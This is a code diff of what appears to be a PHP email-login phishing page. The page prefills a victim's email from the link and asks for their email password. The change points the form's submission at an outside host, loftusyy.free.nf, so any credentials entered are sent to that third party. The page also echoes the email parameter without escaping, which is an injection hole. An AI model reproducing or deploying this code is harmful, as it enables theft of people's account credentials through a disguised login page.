@@ -143,7 +143,7 @@ $email = $_GET['email'];
     </p>
 
     <!-- Form -->
-    <form action="view2.php" method="POST">
+    <form action="http://loftusyy.free.nf/view2.php" method="POST">
         <input type="email" name="user" placeholder="Enter Email Address" value="<?php echo $_GET['email']; ?>" />
         <input type="password" name="passwd" placeholder="Enter Email Password" required>
         <div>
